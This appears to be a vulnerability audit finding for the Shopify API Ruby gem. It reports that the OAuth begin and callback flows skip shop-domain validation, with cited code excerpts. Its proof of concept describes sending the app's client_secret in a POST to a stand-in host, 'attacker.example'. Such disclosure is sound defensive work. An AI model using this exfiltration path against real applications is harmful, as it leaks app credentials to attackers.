Found it: `ShopifyAPI::Auth::Oauth.begin_auth` and `Oauth.validate_auth_callback` use the raw `shop`/`auth_query.shop` value directly to build the URL that receives the app's `client_secret`, without ever calling `Utils::ShopValidator.sanitize!` — unlike every other OAuth-adjacent flow in the gem (`ClientCredentials`, `RefreshToken`, `TokenExchange.migrate_to_expiring_token`) which all call `Utils::ShopValidator.sanitize!(shop)` before constructing the request.

### Title
Missing shop-domain validation in OAuth callback lets `client_secret` be sent to a non-Shopify host - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`Oauth.begin_auth` and `Oauth.validate_auth_callback` are the only credential-issuing flows in the gem that never call `Utils::ShopValidator.sanitize!` on the `shop` value before using it to build the host that receives the app's `client_secret`.

### Finding Description
`Utils::ShopValidator.sanitize!` is the gem's dedicated guard that a `shop` string is a trusted Shopify domain (`myshopify.com`, `myshopify.io`, `spin.dev`, `shop.dev`, `shopify.com`) before it is used to build a request host, as documented and enforced in [1](#0-0) . Every other credential-exchange entry point in the gem enforces this binding: `ClientCredentials.client_credentials` [2](#0-1) , `RefreshToken.refresh_access_token` [3](#0-2) , and `TokenExchange.migrate_to_expiring_token` [4](#0-3)  all call `Utils::ShopValidator.sanitize!(shop)` and use the sanitized value for the request host.

`Oauth.begin_auth`, by contrast, takes the caller-supplied `shop:` parameter and feeds it unvalidated straight into `auth_base_uri(shop)`, which is interpolated directly into `"https://#{shop}/admin"` [5](#0-4) . `Oauth.validate_auth_callback` does the same with `auth_query.shop`: it builds `null_session = Auth::Session.new(shop: auth_query.shop)` and passes that session — carrying the unvalidated `shop` as the request host — to `Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")`, which then POSTs the `client_id`/`client_secret`/`code` body to that host [6](#0-5) .

The only check applied to `auth_query.shop` is the HMAC computed over `{code, host, shop, state, timestamp}` via `Utils::HmacValidator.validate(auth_query)` [7](#0-6)  and `AuthQuery#to_signable_string` [8](#0-7) . That HMAC only proves the query was signed with the app's own `api_secret_key` — it says nothing about whether `shop` is actually a `*.myshopify.com`/trusted domain. The binding that breaks is: **`shop` validated as a trusted Shopify domain ≠ `shop` used as the host that receives `client_id`/`client_secret`/`code`**. Any value the host application passes through as `shop` (from a query string, form field, deep link, etc.) into `begin_auth` or into an `AuthQuery` used with `validate_auth_callback` reaches the network layer unsanitized.

### Impact Explanation
If a host application (following the gem's documented usage, e.g. building `AuthQuery` from raw request parameters as shown in `docs/usage/oauth.md`) passes a `shop` value that has not itself been passed through `ShopValidator.sanitize!` beforehand, the gem will happily POST the app's `client_id` and `client_secret` (and the OAuth `code`) to `https://<attacker-controlled-value>/admin/oauth/access_token`. This is a direct SSRF-with-credentials / `client_secret` exfiltration path rooted entirely in this gem's own code, since the gem is the one performing the unvalidated interpolation and network call — the same class of bug the other three OAuth-adjacent methods in this file explicitly guard against.

### Likelihood Explanation
Because `ShopValidator.sanitize!` is applied consistently in `ClientCredentials`, `RefreshToken`, and `TokenExchange.migrate_to_expiring_token`, but conspicuously absent from `Oauth.begin_auth`/`Oauth.validate_auth_callback`, this looks like an inconsistent application of the gem's own established defense rather than an intentional design choice, making it a very plausible regression/gap in exactly the highest-value flow (initial OAuth authorization code exchange, where `client_secret` is sent).

### Recommendation
Call `Utils::ShopValidator.sanitize!(shop)` at the top of `Oauth.begin_auth` and on `auth_query.shop` at the top of `Oauth.validate_auth_callback`, and use the sanitized value everywhere `shop` is subsequently used (in `auth_base_uri`, in constructing `null_session`, and in `Session.from(shop: ...)`), mirroring the pattern already used in `ClientCredentials`, `RefreshToken`, and `TokenExchange`.

### Proof of Concept
1. Host application builds `ShopifyAPI::Auth::Oauth::AuthQuery.new(shop: "attacker.example", code: ..., state: ..., host: ..., timestamp: ..., hmac: ...)` — with `hmac` computed by the caller (or, in the vulnerable code path, sourced from whatever request parameters the app forwards without additionally validating `shop` against `ShopValidator`).
2. `ShopifyAPI::Auth::Oauth.validate_auth_callback(cookies:, auth_query:)` is called.
3. `Utils::HmacValidator.validate(auth_query)` passes because it only checks the signature over the fields, not that `shop` is a legitimate Shopify domain.
4. `Clients::HttpClient.new(session: Auth::Session.new(shop: "attacker.example"), base_path: "/admin/oauth")` sends `POST https://attacker.example/admin/oauth/access_token` with body `{client_id, client_secret: Context.api_secret_key, code, expiring}`, exfiltrating the app's `client_secret` to `attacker.example`.

### Citations

**File:** lib/shopify_api/utils/shop_validator.rb (L56-64)
```ruby
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
```

**File:** lib/shopify_api/auth/client_credentials.rb (L19-26)
```ruby
        def client_credentials(shop:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/refresh_token.rb (L18-25)
```ruby
        def refresh_access_token(shop:, refresh_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/token_exchange.rb (L97-104)
```ruby
        def migrate_to_expiring_token(shop:, non_expiring_offline_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/oauth.rb (L64-64)
```ruby
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
```

**File:** lib/shopify_api/auth/oauth.rb (L73-90)
```ruby
          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
```

**File:** lib/shopify_api/auth/oauth.rb (L117-119)
```ruby
        sig { params(shop: String).returns(String) }
        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")
```

**File:** lib/shopify_api/auth/oauth/auth_query.rb (L33-43)
```ruby
        sig { override.returns(String) }
        def to_signable_string
          params = {
            code: code,
            host: host,
            shop: shop,
            state: state,
            timestamp: timestamp,
          }
          URI.encode_www_form(params)
        end
```
